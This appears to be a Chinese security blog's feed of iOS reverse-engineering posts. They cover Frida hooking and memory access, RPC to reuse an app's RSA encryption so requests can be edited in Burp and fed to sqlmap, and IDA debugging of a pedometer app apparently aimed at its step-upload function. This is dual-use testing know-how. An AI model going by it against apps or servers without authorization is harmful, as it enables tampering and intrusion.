&lt;p&gt;之前由于在测试时发现ios objective-c的函数如果有参数,打印参数发现不是真的参数,在hook时修改函数参数也会不成功,&lt;a href=&quot;https://github.com/frida/frida/issues/399&quot;&gt;详情&lt;/a&gt;,于是以为frida有bug,后来发现是参数序号写错了,ida中该函数如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void __cdecl -[PARSPedometerInfo setIntegratedSteps:](PARSPedometerInfo *self, SEL a2, signed __int64 a3)
{
  self-&amp;gt;_integratedSteps = a3;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;在上面函数中,a3参数正确的序号是2,(虽然在theos中hook这个函数时只需填写一个参数,[&lt;code class=&quot;highlighter-rouge&quot;&gt;ObjC: args[0] = self, args[1] = selector, args[2-n] = arguments&lt;/code&gt;]),最后代码如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import frida
import sys

session = frida.get_usb_device().attach(797)
script_string = &quot;&quot;&quot;
if (ObjC.available)
{
    try
    {
        var className = &quot;PARSPedometerInfo&quot;;
        var funcName = &quot;- integratedSteps&quot;;
        var hook = eval('ObjC.classes.' + className + '[&quot;' + funcName + '&quot;]');
        Interceptor.attach(hook.implementation, {
          onEnter: function(args) {
            console.log(&quot;Original args0-&amp;gt; type:&quot;+typeof args[0]+&quot; value:&quot;+args[0])

            newargs0=ptr('xxx')
            args[0]=newargs0
            console.log(&quot;New args0-&amp;gt; type:&quot;+typeof args[0]+&quot; value:&quot;+args[0]&quot;)
            send(args[0]);
          },
          onLeave: function(retval) {
            console.log(&quot;Original retval-&amp;gt; type:&quot;+typeof args[0]+&quot; value:&quot;+args[0])

            newretval=ptr(&quot;xxxx&quot;)
            retval.replace(newretval)
            console.log(&quot;New retval-&amp;gt; type:&quot;+typeof args[0]+&quot; value:&quot;+newretval)
            send(newretval)
          }
        });
    }
    catch(err)
    {
        console.log(&quot;[!] Exception2: &quot; + err.message);
    }
}
else
{
    console.log(&quot;Objective-C Runtime is not available!&quot;);
}
&quot;&quot;&quot;


script = session.create_script(script_string)


def on_message(message, data):
    if message['type'] == 'error':
        print(&quot;[!] &quot; + message['stack'])
    elif message['type'] == 'send':
        print(&quot;[i] &quot; + message['payload'])
    else:
        print(message)


script.on('message', on_message)
script.load()
sys.stdin.read()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;0xb-记录函数执行日志&quot;&gt;0xb 记录函数执行日志&lt;/h4&gt;

&lt;p&gt;frida的记录函数执行日志功能在ios逆向中相当于theos的hook函数时记录函数参数和返回值的功能(theos相当于打补丁),优缺点同上面的&lt;code class=&quot;highlighter-rouge&quot;&gt;0xa hook函数&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;frida -U -p pid -l record.js&lt;/code&gt;,或用如下python脚本&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import frida
import sys

session = frida.get_usb_device().attach(797)
script_string = &quot;&quot;&quot;

if (ObjC.available)
{
    try
    {
        var className = &quot;xxx&quot;;
        var funcName = &quot;- xxx&quot;;
        var hook = eval('ObjC.classes.' + className + '[&quot;' + funcName + '&quot;]');
        console.log(&quot;[*] Class Name: &quot; + className);
        console.log(&quot;[*] Method Name: &quot; + funcName);
        Interceptor.attach(hook.implementation, {
          onEnter: function(args) {
            console.log(&quot;param:&quot;+args[0]+&quot; type:&quot;+typeof args[0]);
          },
          onLeave: function(retval) {
            console.log(&quot;retval:&quot;+retval+&quot; type:&quot;+typeof retval);
          }
        });
    }
    catch(err)
    {
        console.log(&quot;[!] Exception2: &quot; + err.message);
    }
}
else
{
    console.log(&quot;Objective-C Runtime is not available!&quot;);
}
&quot;&quot;&quot;

script = session.create_script(script_string)
script.load()
sys.stdin.read()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;0xc-调用函数&quot;&gt;0xc 调用函数&lt;/h4&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt;号开头的函数要&lt;a href=&quot;https://www.frida.re/docs/javascript-api/#objc&quot;&gt;这样&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id __cdecl +[NSString stringWithStrings:](NSString_meta *self, SEL a2, id a3)
{
  __int64 v3; // x20
  void *v4; // x0
  void *v5; // x19
    ...
}


[NSString stringWithString:@&quot;Hello World&quot;] 
becomes 
var NSString = ObjC.classes.NSString; NSString.stringWithString_(&quot;Hello World&quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-&lt;/code&gt;号开头的函数要这样:&lt;/p&gt;

&lt;p&gt;如下代码中调用了PARSHealthPedometer10thHomeViewController类中的requestUploadWithSure函数,这里的requestUploadWithSure函数是&lt;code class=&quot;highlighter-rouge&quot;&gt;-&lt;/code&gt;号开头的函数,其中函数的参数为1,如果requestUploadWithSure函数没有参数,则写法为&lt;code class=&quot;highlighter-rouge&quot;&gt;my_obj[&quot;- requestUploadWithSure&quot;]()&lt;/code&gt;,如果要调用一个&lt;code class=&quot;highlighter-rouge&quot;&gt;-&lt;/code&gt;号开头的类的函数,有2种情况:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;在内存中还没有类的一个实例(对象)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这种情况需要手动生成一个实例,用法为&lt;code class=&quot;highlighter-rouge&quot;&gt;ObjC.classes.类名.alloc()&lt;/code&gt;,在下面的代码中对应&lt;code class=&quot;highlighter-rouge&quot;&gt;var my_obj=ObjC.classes.PARSHealthPedometer10thHomeViewController.alloc()&lt;/code&gt;,其中&lt;code class=&quot;highlighter-rouge&quot;&gt;alloc()&lt;/code&gt;的作用是生成一个类的对象&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;在内存中已经有类的实例(对象)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这种情况需要先找出一个类的实例,使用&lt;code class=&quot;highlighter-rouge&quot;&gt;var tmp=ObjC.chooseSync(ObjC.classes.类名)&lt;/code&gt;,在下面的代码中对应&lt;code class=&quot;highlighter-rouge&quot;&gt;var tmp=ObjC.chooseSync(ObjC.classes.PARSHealthPedometer10thHomeViewController)[0]&lt;/code&gt;,其中&lt;code class=&quot;highlighter-rouge&quot;&gt;[0]&lt;/code&gt;表示取找到的实例中的第一个实例,可根据实际情况换成其他的实例&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import frida
import sys

session = frida.get_usb_device().attach(897)
script_string = &quot;&quot;&quot;

if (ObjC.available)
{
    try
    {
        //var my_obj=ObjC.chooseSync(ObjC.classes.PARSHealthPedometer10thHomeViewController)[0]
        var my_obj=ObjC.classes.PARSHealthPedometer10thHomeViewController.alloc()
        my_obj[&quot;- requestUploadWithSure:&quot;](1)
    }
    catch(err)
    {
        console.log(&quot;[!] Exception2: &quot; + err.message);
    }
}
else
{
    console.log(&quot;Objective-C Runtime is not available!&quot;);
}
&quot;&quot;&quot;


script = session.create_script(script_string)


def on_message(message, data):
    if message['type'] == 'error':
        print(&quot;[!] &quot; + message['stack'])
    elif message['type'] == 'send':
        print(&quot;[i] &quot; + message['payload'])
    else:
        print(message)


script.on('message', on_message)
script.load()
sys.stdin.read()
&quot;&quot;&quot;


script = session.create_script(script_string)

script.load()
sys.stdin.read()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;0xd-读写内存&quot;&gt;0xd 读写内存&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;获取模块加载基址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;可在ida调试ios app时替代vmmap获取加载基址.获取ios app加载基址用法如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import frida
#session = frida.get_usb_device().attach(pid_int_value)
session = frida.get_usb_device().attach(&quot;PALxxx&quot;)
print(session.enumerate_modules())

或者

import frida
#session = frida.get_usb_device().attach(pid_int_value)
session = frida.get_usb_device().attach(&quot;PALxxx&quot;)
base_addr=session.find_base_address(&quot;PALxxx&quot;)
print('0x%x' % base_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;枚举内存范围&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;s.enumerate_ranges('rw-')&lt;/code&gt;:可找出可读可写的内存
&lt;code class=&quot;highlighter-rouge&quot;&gt;s.enumerate_ranges('rwx')&lt;/code&gt;:可找出可读可写可执行的内存&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;read/write memory&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;s.read_bytes(4468416512, 5)&lt;/code&gt;,等同于&lt;code class=&quot;highlighter-rouge&quot;&gt;s.read_bytes(0x10a56a000, 5)&lt;/code&gt;:在0x10a56a000上读5个字节
&lt;code class=&quot;highlighter-rouge&quot;&gt;s.write_bytes(4468416512, &quot;frida&quot;)&lt;/code&gt;:在0x10a56a000上写入”frida”&lt;/p&gt;

&lt;p&gt;一个读内存应用实例&lt;a href=&quot;http://www.freebuf.com/sectool/142928.html&quot;&gt;利用Frida从TeamViewer内存中提取密码&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;0x4-实战&quot;&gt;0x4 实战&lt;/h3&gt;

&lt;h4 id=&quot;0xa-理解brida&quot;&gt;0xa 理解brida&lt;/h4&gt;

&lt;p&gt;为了理解brida,需要理解pyro,参考这两个个连接(&lt;a href=&quot;http://blog.csdn.net/xiaolewennofollow/article/details/52155457&quot;&gt;1&lt;/a&gt;,&lt;a href=&quot;http://python.blog.163.com/blog/static/183010453201201145855429/&quot;&gt;2&lt;/a&gt;)可理解pyro.理解pyro后再理解brida,理解brida后再看看brida中用到的pyro与&lt;a href=&quot;http://5alt.me/2017/11/我是如何用hrida自动生成签名的/&quot;&gt;这里的hrida&lt;/a&gt;,发现只是区别如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;brida:通过pyro开启rpc
hrida:通过http服务开rpc
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这里brida和hrida开rpc的意义在于可以给网络上的其他用户使用本地的frida提供的的调用app中函数的的接口,但是frida已经有了rpc,为什么brida和hrida还要重新开rpc呢?因为frida的rpc只能给本地的其他程序使用(frida的rpc功能也可通过动态修改js内容和send修改后的js的执行结果给python来实现,因为frida加载js会热更新,这样修改js时可修改函数调用,并将函数执行结果发送给python),不能给网络上的其他程序使用,brida开rpc的意义不是很大,因为brida开rpc后是给本地的安全人员写的burp插件使用的,除非安全人员有几个好友,这样这些好友之间就可只要求其中一个人开启brida的rpc服务,其他人使用这个人的brida的rpc即可.frida注入app后可通过开rpc给网络上的其他用户提供调用app函数的接口,例如可通过本地frida注入某上传步数的App后将上传步数的接口通过rpc提供给网络上的人使用&lt;/p&gt;

&lt;p&gt;brida工作原理如下图&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/brida.png&quot; alt=&quot;brida原理图&quot; /&gt;&lt;/p&gt;

&lt;p&gt;也即,brida调用frida的rpc后通过pyro开启一个rpc给安全人员写的burp插件用,目前笔者认为brida只能用于辅助对称加密(如aes)的加密后的数据,也即brida工作时,人工调用brida的解密功能解密数据后再修改数据,然后将修改后的数据再用brida的加密功能加密好,加密好之后再通过burpsuite发送给正常的远程服务器.如果要通过burpsuite来修改非对称加密(如rsa)的加密后的数据需要使用下面的方法&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/articles/web/125260.html&quot;&gt;使用Frida配合Burp Suite追踪API调用&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;上面这个链接里的思路是这样的:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;App(frida)在数据加密前将明文发给burp,burp在人为修改数据后发给回显服务程序,回显服务程序打印burp发来的修改后的数据后,将这个数据发给App(frida).App(frida)收到回显服务程序发来的数据后看看这个数据是哪来的,如果是app没加密之前的数据就发给burp,如果是回显服务程序发来的数据就进行加密,然后再发给正常的服务器进行正常的请求.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;上面链接里的方法看上去只能用于&lt;code class=&quot;highlighter-rouge&quot;&gt;整个post的data部分被加密&lt;/code&gt;的情况,不能用于&lt;code class=&quot;highlighter-rouge&quot;&gt;部分get或post的参数值被加密&lt;/code&gt;的情况,后来笔者写了一个工具&lt;a href=&quot;https://github.com/3xp10it/xenc&quot;&gt;xenc&lt;/a&gt;,可用于2种情况下的加密测试&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1.get或post内容形如&lt;code class=&quot;highlighter-rouge&quot;&gt;mobilePhone=Nns7415cyOT0FkzwbjiXmahxvFt6tfw1Dda8id=1&amp;amp;a=2&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;2.post的整个data部分内容形如&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;ÜñCHÁ*'-»84}_9Óûû84}_9Óûû884}_9Óûû84}_9Óû_9Óûû&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;0xb-实战绕过rsa&quot;&gt;0xb 实战”绕过rsa”&lt;/h4&gt;

&lt;p&gt;这里用&lt;a href=&quot;https://github.com/3xp10it/xenc&quot;&gt;xenc&lt;/a&gt;来测试&lt;code class=&quot;highlighter-rouge&quot;&gt;部分get或post的参数值被加密&lt;/code&gt;的情况&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;注意:手机不要黑屏,app要保证在前台不能在后台运行,黑屏或app进了后台会导致python调用ios app中的加密函数会超时,超时后可将手机打开可继续使用app的加密函数,最好保持手机不自动黑屏并保证app不进后台&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;js文件如下,其中&lt;code class=&quot;highlighter-rouge&quot;&gt;encrypt&lt;/code&gt;函数是一个rsa加密函数:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'use strict';

rpc.exports = {
    encrypt: function (plain) {
        var result=ObjC.classes.PARSCryptDataUtils.encryptWithServerTimestamp_(plain)
        return result.toString()
    },
    add: function (a, b) {
            return a + b;
        }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;burpsuite的repeater中的request内容如下(其中mobilePhone在正常通信时被加密):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /xxx.do HTTP/1.1
Host: 127.0.0.1:8888
Real-Host: xxx.xxx.xxx
Connection: close
Accept: */*
User-Agent: PALxxx/4.11.0 (iPhone; iOS 9.0; Scale/2.00)
Accept-Language: zh-Hans-CN;q=1
X-Tingyun-Id: s8-utloiNb8;c=2;r=736688779
Content-Type: application/x-www-form-urlencoded
Content-Length: 993

mobilePhone=17634526787&amp;amp;id=1&amp;amp;b=2
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;运行xenc.py后设置要加密的参数为mobilePhone,且它的加密函数为&lt;code class=&quot;highlighter-rouge&quot;&gt;encrypt&lt;/code&gt;函数(在上面的js中有两个加密函数&lt;code class=&quot;highlighter-rouge&quot;&gt;encrypt&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;add&lt;/code&gt;),运行完python3 xenc.py后从burpsuite的repeater中发上面的包并右键通过burpsuite测试有没有漏洞,或者将上面的request内容提供给sqlmap等工具进行测试&lt;/p&gt;

</description>
        <pubDate>Fri, 29 Dec 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/12/29/frida%E7%94%A8%E6%B3%95/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/12/29/frida%E7%94%A8%E6%B3%95/</guid>
        
        <category>frida</category>
        
        <category>inject</category>
        
        <category>js</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>ida插件使用备忘录</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;p&gt;记录ida插件使用&lt;/p&gt;

&lt;h3 id=&quot;items&quot;&gt;Items&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/deresz/funcap&quot;&gt;funcap&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;funcap是一个分析函数参数和函数返回值的插件&lt;/li&gt;
      &lt;li&gt;支持的cpu架构:x86,amd64,arm(32)&lt;/li&gt;
      &lt;li&gt;不支持64位的arm(现在的ios设备几乎都是arm64,ios设备cpu类型在&lt;a href=&quot;http://blakespot.com/ios_device_specifications_grid.html&quot;&gt;这里&lt;/a&gt;)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Wed, 27 Dec 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/12/27/ida%E6%8F%92%E4%BB%B6%E4%BD%BF%E7%94%A8%E5%A4%87%E5%BF%98%E5%BD%95/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/12/27/ida%E6%8F%92%E4%BB%B6%E4%BD%BF%E7%94%A8%E5%A4%87%E5%BF%98%E5%BD%95/</guid>
        
        <category>ida</category>
        
        <category>plugin</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>lldb命令</title>
        <description>&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://lldb.llvm.org/lldb-gdb.html&quot;&gt;lldb与gdb对照&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/29687504/lldb-breakpoint-on-all-methods-in-class-objective-c&quot;&gt;lldb在object-c类对象所有函数上设置断点&lt;/a&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;breakpoint set -r '\[ClassName .*\]$'&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;lldb在object-c类对象具体函数上设置断点(未验证) &lt;code class=&quot;highlighter-rouge&quot;&gt;breakpoint set [ClassName functionName]&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gist.github.com/alanzeino/82713016fd6229ea43a8&quot;&gt;lldb常用命令&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;breakpoint set --name &amp;lt;method-name&amp;gt;
    &quot;sets a breakpoint on a given function name, globally. e.g., 
    breakpoint set --name viewDidLoad 
    or 
    breakpoint set --name &quot;-[UIView setFrame:]&quot;
breakpoint set --selector &amp;lt;selector-name&amp;gt;
    &quot;sets a breakpoint on a selector, globally. e.g., 
    breakpoint set --selector dealloc
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Mon, 25 Dec 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/12/25/lldb%E5%91%BD%E4%BB%A4/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/12/25/lldb%E5%91%BD%E4%BB%A4/</guid>
        
        <category>lldb</category>
        
        <category>ios</category>
        
        <category>debug</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>ida通过usb调试ios下的app</title>
        <description>&lt;h3 id=&quot;0x0-必读&quot;&gt;0x0 必读&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://zhoulingyu.com/2016/07/11/iOS攻防——(一)ssh登陆与交叉编译/&quot;&gt;macOS上编译ios程序&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://blog.csdn.net/proteas/article/details/78083512&quot;&gt;使用IDA调试iOS程序的步骤&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://blog.csdn.net/u011661836/article/details/61921308&quot;&gt;ios usb调试&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;0x1-about&quot;&gt;0x1 About&lt;/h3&gt;

&lt;h4 id=&quot;实验环境&quot;&gt;实验环境&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;iphone6s&lt;/li&gt;
  &lt;li&gt;ios9.0&lt;/li&gt;
  &lt;li&gt;macOS sierra&lt;/li&gt;
  &lt;li&gt;ida7.0&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;why&quot;&gt;why&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;对于ida来说,lldb不怎么样(lldb用户体验很一般)&lt;/li&gt;
  &lt;li&gt;wifi调试很慢,ida通过wifi调试不现实&lt;/li&gt;
  &lt;li&gt;ios9以上的&lt;a href=&quot;http://www.newosxbook.com/src.jl?tree=listings&amp;amp;file=12-1-vmmap.c&quot;&gt;这个vmmap&lt;/a&gt;不工作&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;准备&quot;&gt;准备&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/comex/myvmmap/blob/master/myvmmap.c&quot;&gt;可用的vmmap&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;用上面这个链接中的源文件通过&lt;code class=&quot;highlighter-rouge&quot;&gt;xcrun -sdk iphoneos clang -arch armv7 -o [目标文件名] [源文件名]&lt;/code&gt;生成iphone下可执行文件vmmap,编译后文件可在&lt;a href=&quot;https://github.com/3xp10it/mytools/vmmap&quot;&gt;这里&lt;/a&gt;下载&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;usbmuxd&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;brew install usbmuxd&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;目的&quot;&gt;目的&lt;/h4&gt;

&lt;p&gt;使用ida调试一个ios下的app,找到关键上传步数的函数&lt;/p&gt;

&lt;h3 id=&quot;0x2-detail&quot;&gt;0x2 Detail&lt;/h3&gt;

&lt;p&gt;ida调试ios app有两种方法&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;方法一:ida设置使用remote gdb debug server
    &lt;ul&gt;
      &lt;li&gt;可通过wifi或usb调试,使用usb更快&lt;/li&gt;
      &lt;li&gt;通过附加(attach)到已经运行的ios app来调试&lt;/li&gt;
      &lt;li&gt;调试前需人工rebase program&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;方法二:ida设置使用remote ios debug server
    &lt;ul&gt;
      &lt;li&gt;通过usb调试&lt;/li&gt;
      &lt;li&gt;通过加载(app未运行时)未运行的ios app来调试&lt;/li&gt;
      &lt;li&gt;调试前不用人工rebase program,ida会自动修改加载基址(要保证用方法二调试前ios app是关闭的,如果用方法二调试前,ios app已经是正在运行的,这种情况下ida不会自动rebase program,这种情况需要手动rebase program.最好每次调试前检查下ida有没有自行修改好加载基址)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;方法一&quot;&gt;方法一&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;手机上运行目标app:PALxxx
ssh root@iphone
Cluth -i
Cluth -d target_app_index
scp xxx.ipa user@macOS
ps aux | grep PAL*
vmmap target_app_pid
    2771: /private/var/mobile/Containers/Bundle/Application/08C3D11A-82ED-42AA-A975-089E825B7E29/PALxxx.app/PALxxx
    DYLD all image info: 0000000120034000+130 format=1
    read_from_task(0x16fd3bc78, 0x401): kr=1
    00000001000c4000-00000001000c8000 [    16K ] r-x/r-x SM=COW
        (offset 3190000) /private/var/mobile/Containers/Bundle/Application/08C3D11A-82ED-42AA-A975-089E825B7E29/PALxxx.app/PALxxx

    由此得出PALxxx此次加载基址为0x1000c4000

macOS
ida加载ipa中的可执行文件PALxxx
    ida需要分析一段时间,大概10分钟(不分析完时很多函数无法找到),如果想尝试加速分析过程,可参考:https://reverseengineering.stackexchange.com/questions/12485/ida-slow-on-70mb-executable,也即将所有窗口关闭,只保留output窗口
在ida|edit|segments|program rebase中重新设置加载基址为0x1000c8000
    rebase需要一段时间,大概10分钟,如果考虑等的时间太长可尝试去除app的aslr属性,然后重新安装到手机上再调试,去除aslr属性未尝试
iphone连接电脑上的usb
    如果因为连接了usb导致下面无法用gdb server调试(有时连接上usb后ida只会有使用remote ios debuger的选项)则需要先拔掉usb,等选择完设置gdb server调试后再连接上usb
iproxy 2222 2008

ssh root@iphone
debugserver *:2008 -a PALxxx

ida设置远程gdb server(对应ios中的debugserver)调试,参数如下图
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/remote_gdb1.png&quot; alt=&quot;远程gdb server设置&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/remote_gdb2.png&quot; alt=&quot;远程gdb server设置&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;开始在ida中调试
在setIntegratedSteps函数上下断点
运行
命中断点后设置trace functions
在手机上点击上传步数
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;方法二&quot;&gt;方法二&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iphone连上macOS的usb
ida加载PALxxx
在ida中选择remote ios debugger,并设置好symbols和iphone中的app可执行文件的路径
    symbols可在~/ Library / Developer / Xcode / iOS DeviceSupport / &amp;lt;iOS version&amp;gt; / Symbols或通过ios_deploy获得
    app可执行文件路径可在iphone中通过find / -name &quot;PALxxx&quot;获得
开始在ida中调试
ssh root@iphone_ip
ps aux | grep PAL*
vmmap target_app_pid
找到加载基址后在ida|edit|segments|program rebase中检查下是否要重定位,这里一般是不要重定位的
在setIntegratedSteps函数上下断点
运行
命中断点后设置trace functions
在手机上点击上传步数
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;em&gt;注意&lt;/em&gt;
1.使用方法二时最好在&lt;code class=&quot;highlighter-rouge&quot;&gt;debugger|debugger options&lt;/code&gt;中的如下窗口中的&lt;code class=&quot;highlighter-rouge&quot;&gt;launch debuger automaticly&lt;/code&gt;选项钩上(默认是钩上的)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/ida_usb_debug_option1.png&quot; alt=&quot;launch debuger automaticly&quot; /&gt;&lt;/p&gt;

&lt;p&gt;钩上后在&lt;code class=&quot;highlighter-rouge&quot;&gt;debugger|process options&lt;/code&gt;中只需要填写远程待调试的可执行文件的在远程设备上的物理路径,如下图:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/ida_usb_debug_option2.png&quot; alt=&quot;process options&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果不钩上&lt;code class=&quot;highlighter-rouge&quot;&gt;launch debuger automaticly&lt;/code&gt;选项,有时候ida会在上图中要求填入远程debug server的ip地址和端口&lt;/p&gt;

&lt;p&gt;2.使用方法二时,有时候ida会提示无法找到远程手机上的指定路径的可执行文件,在ida的output窗口也会显示debugserver服务出错,这种情况可通过下面2步解决&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;在macOS中打开xcode(保证手机通过usb连接macOS)&lt;/li&gt;
  &lt;li&gt;如果上一步没解决则查看iphone上是否正在运行待调试的app,如果是,则关闭这个app&lt;/li&gt;
  &lt;li&gt;检测是否开了虚拟机,如果开了检测是否手机已经连接到了虚拟机上,如果连接到虚拟机了则要在虚拟机中设置断开iphone的连接&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;3.在方法一或方法二中提到使用trace functions来尝试记录出关键上传函数,在ida(7.0)中远程调试ios app时发现有时设置trace后会导致ios app卡住而无法继续运行,原来以为是有哪些线程卡住了,后来发现不是,原因是trace导致ios app在手机中卡住,这里在ida中暂关闭trace即可让ios app继续正常运行,这应该是ida的bug.&lt;/p&gt;

&lt;h4 id=&quot;分析&quot;&gt;分析&lt;/h4&gt;

&lt;p&gt;上面2种方法trace到关键函数如下:&lt;/p&gt;

